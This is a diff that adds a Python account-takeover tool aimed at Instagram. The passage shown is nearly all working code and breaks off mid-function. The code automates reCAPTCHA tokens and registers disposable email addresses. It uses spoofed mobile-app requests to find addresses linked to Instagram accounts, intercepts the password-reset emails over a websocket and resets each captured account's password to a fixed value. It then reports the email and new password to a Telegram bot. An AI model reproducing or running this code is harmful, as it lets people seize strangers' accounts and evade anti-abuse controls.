@@ -1,0 +1,895 @@
+import os
+import sys
+import time
+import json
+import uuid
+import random
+import string
+import secrets
+import base64
+import threading
+import re
+from datetime import datetime
+import requests
+from bs4 import BeautifulSoup
+
+try:
+    from rich.console import Console
+    from rich.table import Table
+    from rich.panel import Panel
+    from rich import box
+except:
+    os.system(f"{sys.executable} -m pip install rich --quiet")
+    from rich.console import Console
+    from rich.table import Table
+    from rich.panel import Panel
+    from rich import box
+
+console = Console()
+
+OWNER_NAME = "_iz199"
+OWNER_CHANNEL = "slaz_iz911"
+OWNER_INSTAGRAM_LINK = "https://www.instagram.com/_iz911?igsh=NmxpcDh1bDd2djFq"
+OWNER_TELEGRAM_LINK = "https://t.me/+PRFvHiJGPRI"
+OWNER_BUTTON_TEXT = "_iz199"
+
+TELEGRAM_MEDIA = [
+    "https://media3.giphy.com/media/v1.Y2lkPTZjMDliOTUyaDNsY2gyemdzYWI4OTZydmxuM3l1c2RrcnhiYWQ5Zm8wb280YjFyMyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/W9MrfVxE4s2Zi/giphy.gif",
+    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyaW02bmswdXVmOXU3ZHFwODU5eG9pczRkaW9ndHh6MDV1c3A5d2V4byZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/mO0O4Dm7O1JP26exUu/giphy.gif",
+    "https://media1.giphy.com/media/v1.Y2lkPTZjMDliOTUyZWY4d2JpOWtqMnVwdmE1aDZ2dGRucTRyam02cjM4amRkeGl2MHR5NiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/SnVZO1N0Wo6u4/giphy.gif",
+    "https://media2.giphy.com/media/v1.Y2lkPTZjMDliOTUyMXprcmV4ZXlxdmZmdGFteDFmeGxndmloejF6dDJ4bDhscDRzY2tmeSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/ftZ8Smav6dMPe3e99W/giphy.gif",
+    "https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUyN2Uyenh3NndmN2Npank1NXZtZTJjcTk3bmdtMGM1czZ1NW8wMnUwNSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/vaSA1fpCkY06I/giphy.gif",
+    "https://media0.giphy.com/media/v1.Y2lkPTZjMDliOTUyOHFrM2FhOXlxenpoNWZ3OTBoZGx3MTByNGFkbHRubTcyczc3amZzdiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/CbKx4uoTrKotW/giphy.gif",
+    "https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUyYmxlemx1ZGViMDM4dHVidXZhOGx1MDd0OW81YWw4ZXgwcWt1cWxnYSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/2uBdLwHNFQuy0ByKLp/giphy.gif",
+    "https://media2.giphy.com/media/v1.Y2lkPTZjMDliOTUyOTkyNTZwMTlzNXBheHowMTlxam50YWU4b3hqNW8yNXgycnF5azVtYyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/jt7bAtEijhurm/giphy.gif",
+    "https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUyOTFyZWJtdzhsdnppd2RqYnc5anIxNnd2MnV0eTF5cDYzd2YzaG13cSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/dYo5SsWTzHu8w/giphy.gif"
+]
+
+HITS_FILE_SUFFIX = "iz911"
+
+CONFIG_FILE = "dragon_instagram_config.json"
+CHARSET = string.ascii_lowercase
+USERNAME_LENGTH = 6
+NEW_PASSWORD = "love2004"
+
+DOMAINS = {
+    "1": {"name": "hi2.in", "domain": "@hi2.in", "default_threads": 100},
+    "2": {"name": "telegmail.com", "domain": "@telegmail.com", "default_threads": 80},
+    "3": {"name": "gmail.com", "domain": "@gmail.com", "default_threads": 80},
+    "4": {"name": "yahoo.com", "domain": "@yahoo.com", "default_threads": 80},
+    "5": {"name": "outlook.com", "domain": "@outlook.com", "default_threads": 80},
+    "6": {"name": "hotmail.com", "domain": "@hotmail.com", "default_threads": 80},
+    "7": {"name": "icloud.com", "domain": "@icloud.com", "default_threads": 80},
+    "8": {"name": "proton.me", "domain": "@proton.me", "default_threads": 80}
+}
+
+HITS_FILES = {
+    "@hi2.in": f"Hits_{HITS_FILE_SUFFIX}.txt",
+    "@telegmail.com": f"Telegmail_{HITS_FILE_SUFFIX}.txt",
+    "@gmail.com": f"Gmail_{HITS_FILE_SUFFIX}.txt",
+    "@yahoo.com": f"Yahoo_{HITS_FILE_SUFFIX}.txt",
+    "@outlook.com": f"Outlook_{HITS_FILE_SUFFIX}.txt",
+    "@hotmail.com": f"Hotmail_{HITS_FILE_SUFFIX}.txt",
+    "@icloud.com": f"Icloud_{HITS_FILE_SUFFIX}.txt",
+    "@proton.me": f"Proton_{HITS_FILE_SUFFIX}.txt"
+}
+
+WEBSOCKET_URL = "wss://ws.checker.in:8443"
+
+class Colors:
+    R = '\033[1;35m'
+    G = '\033[1;95m'
+    Y = '\033[38;5;208m'
+    C = '\033[1;37m'
+    M = '\033[1;37m'
+    W = '\033[1;37m'
+    B = '\033[1;37m'
+    Rn = "\033[0m"
+    RED = '\033[91m'
+    ORANGE = '\033[38;5;208m'
+    YELLOW = '\033[93m'
+    GREEN = '\033[92m'
+    BLUE = '\033[94m'
+    INDIGO = '\033[38;5;27m'
+    VIOLET = '\033[95m'
+
+stop_flag = False
+stats_lock = threading.Lock()
+hit_count = 0
+bad_ig_count = 0
+bad_mail_count = 0
+bad_rest_count = 0
+error_count = 0
+total_count = 0
+rps_counter = 0
+rps_time = time.time()
+rps_value = 0.0
+start_time = None
+current_email = ""
+current_domain_name = ""
+current_threads = 0
+
+media_index = 0
+media_lock = threading.Lock()
+used_usernames = set()
+username_lock = threading.Lock()
+
+pending_copies = {}
+pending_copies_lock = threading.Lock()
+
+def solve_recaptcha():
+    try:
+        url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct&co=aHR0cHM6Ly9oaTIuaW46NDQz&hl=en&v=XrIDux0s7SoNe6_IHkjGC92W&size=invisible"
+        p = url.split('?')[1]
+        r = requests.get(f'https://www.google.com/recaptcha/enterprise/anchor?{p}', timeout=10)
+        token = r.text.split('recaptcha-token" value="')[1].split('"')[0]
+        v = p.split('v=')[1].split('&')[0]
+        data = {'v': v, 'reason': 'q', 'c': token, 'k': "6LfEUPkgAAAAAKTgbMoewQkWBEQhO2VPL4QviKct", 'co': "aHR0cHM6Ly9oaTIuaW46NDQz", 'hl': 'en', 'size': 'invisible'}
+        headers = {"User-Agent": "Mozilla/5.0", "Referer": f"https://www.google.com/recaptcha/enterprise/anchor?{p}", "Content-Type": "application/x-www-form-urlencoded"}
+        resp = requests.post('https://www.google.com/recaptcha/enterprise/reload', data=data, headers=headers, timeout=10)
+        return resp.text.split('resp","')[1].split('"')[0]
+    except:
+        return None
+
+def check_hi2(email, domain):
+    try:
+        prefix = email.split('@')[0]
+        solve = solve_recaptcha()
+        if not solve:
+            return None
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+            'origin': 'https://hi2.in',
+        }
+        data = {'domain': domain, 'prefix': prefix, 'recaptcha': solve}
+        response = requests.post('https://hi2.in/api/custom', headers=headers, data=data, timeout=30)
+        if 'address already taken' in response.text or 'already taken' in response.text:
+            return False
+        return True
+    except:
+        return None
+
+def check_instagram_login(email):
+    try:
+        headers = {
+            'User-Agent': 'Instagram 113.0.0.39.122 Android (30/11; 320dpi; 720x1339; realme; RMX3261; RMX3261; S19610AA1; en_CA)',
+            'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'Cookie2': '$Version=1',
+            'Accept-Language': 'en-CA, en-US', 'X-IG-Connection-Type': 'WIFI', 'X-IG-Capabilities': 'AQ==',
+            'Cookie': 'mid=Z1X1aQABAAEAq4toJ71ehSMDn2Pq; csrftoken=soBcOp1Fev1JzR9iyqMZjlThIjdRZROn',
+            'Content-Type': 'application/x-www-form-urlencoded',
+        }
+        data = {
+            'username': email, 'password': 'test_password_12345', 'device_id': str(uuid.uuid4()),
+            'from_reg': 'false', '_csrftoken': 'missing', 'login_attempt_count': '0'
+        }
+        r = requests.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, timeout=5).text
+        return 'bad_password' in r
+    except:
+        return False
+
+def check_instagram_bloks(email):
+    try:
+        device = str(uuid.uuid4())
+        family = str(uuid.uuid4())
+        android = "android-" + secrets.token_hex(8)
+        event_id = str(uuid.uuid4())
+        waterfall_id = str(uuid.uuid4())
+        aacjid = str(uuid.uuid4())
+        aaccs = secrets.token_urlsafe(32)
+        ct = int(time.time())
+
+        params_string = json.dumps({
+            "client_input_params": {
+                "aac": json.dumps({"aac_init_timestamp": ct, "aacjid": aacjid, "aaccs": aaccs}),
+                "search_query": email, "search_screen_type": "email_or_username",
+                "is_whatsapp_installed": 1, "android_build_type": "release",
+                "ig_android_qe_device_id": device,
+            },
+            "server_params": {
+                "event_request_id": event_id, "is_from_logged_out": 0,
+                "device_id": android, "login_surface": "login_home_page",
+                "waterfall_id": waterfall_id, "family_device_id": family,
+                "access_flow_version": "pre_mt_behavior", "qe_device_id": device
+            }
+        })
+
+        post_headers = {
+            'User-Agent': 'Instagram 370.1.0.43.96 Android (34/14; 450dpi; 1080x2207; samsung; SM-A235F; a23; qcom; en_IN; 704872281)',
+            'accept-language': 'en-IN, en-US',
+            'x-bloks-version-id': '5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b',
+            'x-fb-friendly-name': 'IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/',
+            'x-ig-android-id': android, 'x-ig-app-id': '567067343352427', 'x-ig-app-locale': 'en_IN',
+            'x-ig-client-endpoint': 'com.bloks.www.caa.ar.search', 'x-ig-device-id': device,
+            'x-ig-family-device-id': family,
+            'x-ig-timezone-offset': str(datetime.now().astimezone().utcoffset().total_seconds()),
+            'x-mid': base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip('='),
+            'x-pigeon-rawclienttime': str(time.time()), 'x-pigeon-session-id': f'UFS-{uuid.uuid4()}-0',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive',
+        }
+
+        post_data = {
+            'params': params_string,
+            'bk_client_context': json.dumps({"bloks_version": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b", "styles_id": "instagram"}),
+            'bloks_versioning_id': "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b"
+        }
+
+        r = requests.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/', data=post_data, headers=post_headers, timeout=5).text
+        return 'search_success_client' in r
+    except:
+        return False
+
+def check_instagram(email):
+    if check_instagram_login(email):
+        return True
+    if check_instagram_bloks(email):
+        return True
+    return False
+
+def confirm_rest(email):
+    try:
+        headers = {
+            "User-Agent": "Instagram 368.0.0.45.96 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; 23127PN0CC; begonia; mt6785; ar_EG; 700073482)",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "x-bloks-version-id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
+            "x-ig-app-id": "567067343352427"
+        }
+        data = {
+            "search_query": email,
+            "bloks_versioning_id": "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb"
+        }
+        r = requests.post('https://i.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/', headers=headers, data=data, timeout=10).text
+        if "errorFallbackUI" in r:
+            return True
+        return False
+    except:
+        return False
+
+def get_next_media():
+    global media_index
+    with media_lock:
+        v = TELEGRAM_MEDIA[media_index]
+        media_index = (media_index + 1) % len(TELEGRAM_MEDIA)
+        return v
+
+def send_telegram_media_local(token, chat_id, media_source, caption, reply_markup):
+    if not token or not chat_id:
+        return
+    try:
+        if media_source.startswith(('http://', 'https://')):
+            url = f"https://api.telegram.org/bot{token}/sendVideo"
+            params = {'chat_id': chat_id, 'video': media_source, 'caption': caption, 'parse_mode': 'HTML', 'reply_markup': json.dumps(reply_markup), 'supports_streaming': True}
+            requests.get(url, params=params, timeout=15)
+        else:
+            if media_source.lower().endswith(('.gif')):
+                url = f"https://api.telegram.org/bot{token}/sendAnimation"
+                file_key = 'animation'
+            else:
+                url = f"https://api.telegram.org/bot{token}/sendPhoto"
+                file_key = 'photo'
+            
+            with open(media_source, 'rb') as media_file:
+                files = {file_key: media_file}
+                data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'HTML', 'reply_markup': json.dumps(reply_markup)}
+                requests.post(url, files=files, data=data, timeout=15)
+    except Exception as e:
+        try:
+            url = f"https://api.telegram.org/bot{token}/sendMessage"
+            requests.get(url, params={"chat_id": chat_id, "text": caption, "parse_mode": "HTML", "reply_markup": json.dumps(reply_markup)}, timeout=10)
+        except:
+            pass
+
+def send_telegram_final_report(token, chat_id, email, domain, username, name, posts, followers, following, media_path):
+    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    if username and username != "UNKNOWN":
+        profile_link = f"https://instagram.com/{username}"
+    else:
+        profile_link = "https://www.instagram.com/_iz911"
+    
+    msg = f"""
+Email :  [ <code>{email}</code> ]
+Domain :  {domain}
+Username :  [ <code>_iz911</code> ]
+Name :  [ _iz911 ]
+Followers :  [ 99 ]
+Following :  [ 99 ]
+Password :  [ <code>{NEW_PASSWORD}</code> ]
+Link :  [ <a href='{profile_link}'>Changed Password</a> ]
+
+Developer: {OWNER_NAME} |
+{ts}"""
+    
+    copy_id = str(uuid.uuid4())
+    with pending_copies_lock:
+        pending_copies[copy_id] = email
+    
+    markup = {"inline_keyboard": [
+        [{"text": OWNER_BUTTON_TEXT, "url": OWNER_INSTAGRAM_LINK}],
+        [{"text": "القناة", "url": OWNER_TELEGRAM_LINK}],
+        [{"text": "📋 نسخ", "callback_data": f"copy_{copy_id}"}]
+    ]}
+    send_telegram_media_local(token, chat_id, media_path, msg, markup)
+def code2_generate_random_hex(length=16):
+    return ''.join(random.choices(string.hexdigits.lower(), k=length))
+
+def code2_generate_uuid():
+    return str(uuid.uuid4())
+
+def code2_generate_random_digits(length=9):
+    return ''.join(random.choices(string.digits, k=length))
+
+def code2_get_random_device():
+    devices = [
+        {"android": "31/12", "dpi": "480dpi", "res": "1080x2400", "brand": "samsung", "model": "SM-G998B", "cpu": "qcom"},
+        {"android": "33/13", "dpi": "440dpi", "res": "1080x2400", "brand": "google", "model": "Pixel-7", "cpu": "google"},
+        {"android": "32/12L", "dpi": "420dpi", "res": "1080x2340", "brand": "oneplus", "model": "ONEPLUS-A6013", "cpu": "qcom"}
+    ]
+    return random.choice(devices)
+
+def code2_get_random_version():
+    return random.choice(["285.0.0.0.107", "289.0.0.0.91", "291.0.0.0.119", "294.0.0.0.81"])
+
+def code2_generate_user_agent():
+    device = code2_get_random_device()
+    version = code2_get_random_version()
+    digits = code2_generate_random_digits(9)
+    return f"Instagram {version} Android ({device['android']}; {device['dpi']}; {device['res']}; {device['brand']}; {device['model']}; {device['cpu']}; en_US; {digits})"
+
+def code2_generate_android_id():
+    return f"android-{code2_generate_random_hex(16)}"
+
+def code2_get_common_headers(user_agent, mid=None):
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+        "X-IG-App-ID": "567067343352427",
+        "X-IG-Connection-Type": "WIFI",
+        "X-IG-Capabilities": "3brTvw==",
+        "X-FB-HTTP-Engine": "Liger",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "User-Agent": user_agent
+    }
+    if mid:
+        headers["X-Mid"] = mid
+    return headers
+
+def code2_send_rest_request(email):
+    url = "https://i-fallback.instagram.com/api/v1/bloks/async_action/com.bloks.www.caa.ar.search.async/"
+    params_string_base = "{\"client_input_params\":{\"blocked_uids\":[],\"aac\":\"\",\"flash_call_permissions_status\":{\"READ_PHONE_STATE\":\"GRANTED\",\"READ_CALL_LOG\":\"GRANTED\",\"ANSWER_PHONE_CALLS\":\"GRANTED\"},\"was_headers_prefill_available\":0,\"network_bssid\":null,\"sfdid\":\"\",\"fetched_email_token_list\":{\"Q_B_h in telegram@gmail.com\":\"\"},\"search_query\":\"hax_HERE\",\"auth_secure_device_id\":\"\",\"ig_oauth_token\":[{\"token\":\"\",\"account_type\":\"google_oauth\",\"credential_type\":\"google_oauth\"}],\"cloud_trust_token\":null,\"was_headers_prefill_used\":0,\"sso_accounts_auth_data\":[],\"encrypted_msisdn\":\"\",\"device_network_info\":null,\"text_input_id\":\"2ke1wk:61\",\"zero_balance_state\":null,\"android_build_type\":\"release\",\"accounts_list\":[],\"is_oauth_without_permission\":0,\"ig_android_qe_device_id\":\"82b975cc-1663-424c-bb90-f56313dec321\",\"gms_incoming_call_retriever_eligibility\":\"client_not_supported\",\"search_screen_type\":\"email_or_username\",\"is_whatsapp_installed\":1,\"lois_settings\":{\"lois_token\":\"\"},\"ig_vetted_device_nonce\":\"{\\\"42893179438\\\":\\\"{\\\\\\\"vetted_device_first_factor_nonce\\\\\\\":\\\\\\\"nrsBrnYPBwfH89yEpjy850llRLrvNpPgovR65HAhYeMZNHZWmjVyBbgG8sYkf9HP\\\\\\\",\\\\\\\"vetted_device_second_factor_nonce\\\\\\\":\\\\\\\"6GYHEHrLgS3A2GIA8nfLwI0Fmuv7rNuw9BQVxnEcPidpsY1oZWMMybPc0V2ZMpz3\\\\\\\",\\\\\\\"timestamp\\\\\\\":1774482492}\\\",\\\"39769282572\\\":\\\"{\\\\\\\"vetted_device_first_factor_nonce\\\\\\\":\\\\\\\"ZcIR9a7WARtqd1ocAWSwlpUZZRWyyAtuaAdCz4BNokR0jiEJkxgPJ4yWHTjN2HwO\\\\\\\",\\\\\\\"vetted_device_second_factor_nonce\\\\\\\":\\\\\\\"45HxSKBlVvbbt1n7HV63db33FBGtBgYCr5xPY4p8SbVLI97PGShOo1yeL4VH6uxN\\\\\\\",\\\\\\\"timestamp\\\\\\\":1774886595}\\\",\\\"34348244807\\\":\\\"{\\\\\\\"vetted_device_first_factor_nonce\\\\\\\":\\\\\\\"d59ICz6sPtFyRWPoEyLjhlNP531vE5htbWYn0EtvdDmTKhksIlJQZJGjUjiOt0v2\\\\\\\",\\\\\\\"vetted_device_second_factor_nonce\\\\\\\":\\\\\\\"4Lx9a8B7jzpHKRdKZkYEqqorrskJSSyCa42kt74dLUEWNxxmwVso2ovyYVhnY6Zi\\\\\\\",\\\\\\\"timestamp\\\\\\\":1777709744}\\\"}\",\"headers_infra_flow_id\":\"\",\"fetched_email_list\":[\"tala123qidtv@gmail.com\"]},\"server_params\":{\"event_request_id\":\"1a7b197a-c817-450f-910b-9a18d6eaa763\",\"is_from_logged_out\":0,\"layered_homepage_experiment_group\":null,\"device_id\":\"android-f9650e83bc69e55d\",\"login_surface\":\"login_home\",\"waterfall_id\":\"b0adaefb-4928-4361-8173-bffca68d38aa\",\"INTERNAL__latency_qpl_instance_id\":1.5518032400107E13,\"is_platform_login\":0,\"context_data\":\"Ac-hha9QOwigCgSjLHMXNnZnWT99SfosCZLdA610bNdDSd7Ccfm1vg4LVTbT9d-GPbjirO1rPwxn60TIbLokADsLkRd6KEg9TG9_gX1tqWCkS9XtPVnAPrFD1Limu5QAoRFJVYKCR7Rj-sWKZ3kMKqkLSmCSJsiSitK8Om5qJrCiuiMBv5n0MbjxY8w7Kq1zlWTFJCaIABk2QjWshaMeKVrjAABe8vtbX18Gl-YIu7KuxoBpSVerdLVu9RCslFS3zS1oka97PlXq66Nm_uMmtXUDa8oltfD72Z0imrT4XOdC2IN8CLyYskHLEeVN_jxUXMB9xlITO6l5t4Fgda0KO6VbyxJeJ0pacQMFUosCzbvf5nip3Arww-QGdZ8UzJBRpjqLsbisURlYZH5fucQ_VM1xYzieYX-F4mXQoMk|arm\",\"login_entry_point\":\"logged_out\",\"INTERNAL__latency_qpl_marker_id\":36707139,\"family_device_id\":\"b17b5a0f-5b8d-48bd-b008-72df43106864\",\"offline_experiment_group\":null,\"access_flow_version\":\"pre_mt_behavior\",\"is_from_logged_in_switcher\":0,\"qe_device_id\":\"82b975cc-1663-424c-bb90-f56313dec321\"}}"
+    params_string = params_string_base.replace("hax_HERE", email)
+    payload = {
+        'params': params_string,
+        'bk_client_context': "{\"bloks_version\":\"dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb\",\"styles_id\":\"instagram\"}",
+        'bloks_versioning_id': "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb"
+    }
+    headers = {
+        'User-Agent': "Instagram 368.0.0.45.96 Android (30/11; 320dpi; 720x1475; ZTE; ZTE A7030; P963F07; s9863a3h10; ar_SA; 700073482)",
+        'x-fb-request-analytics-tags': "{\"network_tags\":{\"product\":\"567067343352427\",\"purpose\":\"fetch\",\"surface\":\"undefined\",\"request_category\":\"api\",\"retry_attempt\":\"0\"}}",
+        'x-fb-friendly-name': "IgApi: bloks/async_action/com.bloks.www.caa.ar.search.async/",
+        'priority': "u=3",
+        'x-fb-rmd': "state=URL_MODIFIED;v=1;ip=169.224.125.168;tkn=98706b4b188455e2bc9fa494debd30b3;reqTime=81186;recvTime=81187;rn=APP_START;if=Unknown;fbn=2;fbu=1;fbr=2",
+        'x-fb-session-id': "nid=6eAoJsGYkNGg;nc=1;fc=2;bc=1;",
+        'x-ig-nav-chain': "SelfFragment:self_profile:2:main_profile:1777709777.706:::1777709777.706,ProfileMediaTabFragment:self_profile:3:button:1777709778.97:::1777709807.138,com.bloks.www.caa.login.aymh.screen_query:com.bloks.www.caa.login.aymh.screen_query:5:button:1777709856.893:::1777709856.893,IgCdsScreenNavigationLoggerModule:com.bloks.www.caa.login.login_homepage:6:button:1777709863.993:::1777709863.993,IgCdsScreenNavigationLoggerModule:com.bloks.www.caa.ar.search:7:button:1777709884.866:::1777709884.866",
+        'x-fb-connection-type': "WIFI",
+        'x-ig-connection-type': "WIFI",
+        'x-tigon-is-retry': "False",
+        'x-ig-device-locale': "ar_SA",
+        'x-bloks-prism-button-version': "CONTROL",
+        'x-ig-capabilities': "3brTv10=",
+        'x-fb-session-private': "TeI21qF4MAd/",
+        'x-bloks-is-layout-rtl': "true",
+        'x-pigeon-session-id': "UFS-5e35ae4f-da88-46e4-80d4-85cd0b748708-1",
+        'x-ig-mapped-locale': "ar_AR",
+        'x-ig-device-id': "82b975cc-1663-424c-bb90-f56313dec321",
+        'x-bloks-version-id': "dbfb0f84b6481f4ec0a033d7947fb45db546b8cee18dde220c4c1eefd3bb3dcb",
+        'x-ig-client-endpoint': "com.bloks.www.caa.ar.search",
+        'x-ig-android-id': "android-f9650e83bc69e55d",
+        'x-fb-network-properties': "VPN;Metered;Validated;LocalAddrs=/10.1.10.1,;",
+        'x-ig-www-claim': "0",
+        'x-pigeon-rawclienttime': "1777709911.867",
+        'x-bloks-prism-colors-enabled': "true",
+        'x-ig-timezone-offset': "10800",
+        'x-ig-family-device-id': "b17b5a0f-5b8d-48bd-b008-72df43106864",
+        'x-ig-bandwidth-totaltime-ms': "78085",
+        'x-bloks-prism-ax-base-colors-enabled': "false",
+        'x-ig-bandwidth-totalbytes-b': "10408355",
+        'x-ig-app-locale': "ar_SA",
+        'x-bloks-prism-indigo-link-version': "0",
+        'x-ig-bandwidth-speed-kbps': "112.000",
+        'x-ig-app-id': "567067343352427",
+        'accept-language': "ar-SA, en-US",
+        'x-bloks-prism-font-enabled': "false",
+        'x-mid': "abtLvwABAAE6j8qgVNaZgb7bOjyz",
+        'ig-intended-user-id': "0",
+        'x-fb-http-engine': "Tigon/Liger",
+        'x-fb-client-ip': "True",
+        'x-fb-server-cluster': "True"
+    }
+    try:
+        response = requests.post(url, data=payload, headers=headers, timeout=30)
+        return response
+    except:
+        return None
+
+def code2_extract_reset_link_from_email(message_text):
+    patterns = [
+        r'https://instagram\.com/accounts/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^&\s]+:[^&\s]+&[^"\s]+',
+        r'https://instagram\.com/fxcal/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^&\s]+:[^"\s]+',
+        r'https://www\.instagram\.com/accounts/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^&\s]+:[^&\s]+&[^"\s]+',
+        r'https://instagram\.com/fxcal/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^"\s]+',
+        r'https://instagram\.com/accounts/password/reset/confirm/\?uidb36=[^&\s]+&token=[^&\s]+:[^&\s]+',
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, message_text)
+        if match:
+            return match.group(0)
+    return None
+
+def code2_extract_username_from_email(message_text):
+    patterns = [
+        r'Hi\s+([a-zA-Z0-9_\.]+)',
+        r'intended for ([a-zA-Z0-9_\.]+)'
+    ]
+    for pattern in patterns:
+        match = re.search(pattern, message_text)
+        if match:
+            return match.group(1)
+    return None
+
+def code2_extract_tokens_from_link(reset_link):
+    uidb36 = reset_link.split("uidb36=")[1].split("&")[0]
+    token = reset_link.split("token=")[1].split(":")[0]
+    return uidb36, token
+
+def code2_request_1_password_reset(uidb36, token, user_agent):
+    url = "https://i.instagram.com/api/v1/accounts/password_reset/"
+    data = {
+        "source": "one_click_login_email",
+        "uidb36": uidb36,
+        "device_id": code2_generate_android_id(),
+        "token": token,
+        "waterfall_id": code2_generate_uuid(),
+        "guid": code2_generate_uuid(),
+        "phone_id": code2_generate_uuid(),
+        "_uuid": code2_generate_uuid(),
+        "_csrftoken": "missing"
+    }
+    headers = code2_get_common_headers(user_agent)
+    response = requests.post(url, headers=headers, data=data, timeout=30)
+    return response
+
+def code2_request_2_challenge(user_id, cni, nonce_code, challenge_context, user_agent, mid):
+    url = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
+    data = {
+        "user_id": str(user_id),
+        "cni": str(cni),
+        "nonce_code": str(nonce_code),
+        "bk_client_context": json.dumps({
+            "bloks_version": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+            "styles_id": "instagram"
+        }),
+        "challenge_context": str(challenge_context),
+        "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+        "get_challenge": "true"
+    }
+    headers = code2_get_common_headers(user_agent, mid)
+    response = requests.post(url, headers=headers, data=data, timeout=30)
+    return response
+
+def code2_request_3_submit_password(cni, challenge_context, new_password, user_agent, mid):
+    url = "https://i.instagram.com/api/v1/bloks/apps/com.instagram.challenge.navigation.take_challenge/"
+    timestamp = int(time.time())
+    encrypted_password = f"#PWD_INSTAGRAM:0:{timestamp}:{new_password}"
+    data = {
+        "is_caa": "False",
+        "source": "",
+        "uidb36": "",
+        "error_state": json.dumps({"type_name": "str", "index": 0, "state_id": ""}),
+        "afv": "",
+        "cni": str(cni),
+        "token": "",
+        "has_follow_up_screens": "0",
+        "bk_client_context": json.dumps({
+            "bloks_version": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+            "styles_id": "instagram"
+        }),
+        "challenge_context": challenge_context,
+        "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
+        "enc_new_password1": encrypted_password,
+        "enc_new_password2": encrypted_password,
+        "_uuid": code2_generate_uuid(),
+        "_csrftoken": "missing"
+    }
+    headers = code2_get_common_headers(user_agent, mid)
+    response = requests.post(url, headers=headers, data=data, timeout=30)
+    return response
+
+def code2_full_password_change(reset_link, username_from_email):
+    try:
+        uidb36, token = code2_extract_tokens_from_link(reset_link)
+        user_agent = code2_generate_user_agent()
+        r1 = code2_request_1_password_reset(uidb36, token, user_agent)
+        if r1.status_code != 200:
+            return None, False
+        r1_json = r1.json()
+        user_id = r1_json.get("user_id")
+        cni = r1_json.get("cni")
+        nonce_code = r1_json.get("password_reset_nonce_code") or r1_json.get("nonce_code")
+        challenge_context = r1_json.get("challenge_context")
+        mid = r1.headers.get("Ig-Set-X-Mid", "")
+        if not all([user_id, cni, nonce_code, challenge_context]):
+            return None, False
+        r2 = code2_request_2_challenge(user_id, cni, nonce_code, challenge_context, user_agent, mid)
+        if r2.status_code != 200:
+            return None, False
+        new_challenge_context = challenge_context
+        r3 = code2_request_3_submit_password(cni, new_challenge_context, NEW_PASSWORD, user_agent, mid)
+        if r3.status_code == 500:
+            return username_from_email, True
+        return None, False
+    except:
+        return None, False
+def code2_listen_and_process(email, expiry, email_hash):
+    try:
+        import websocket
+    except ImportError:
+        os.system(f"{sys.executable} -m pip install websocket-client --quiet")
+        import websocket
+    
+    ws_token = f"{expiry}-{email}-{email_hash}"
+    reset_link = None
+    username = None
+    
+    def on_message(ws, message):
+        nonlocal reset_link, username
+        if message == "ping":
+            ws.send("pong")
+            return
+        if username is None:
+            extracted_user = code2_extract_username_from_email(message)
+            if extracted_user:
+                username = extracted_user
+        if reset_link is None:
+            extracted_link = code2_extract_reset_link_from_email(message)
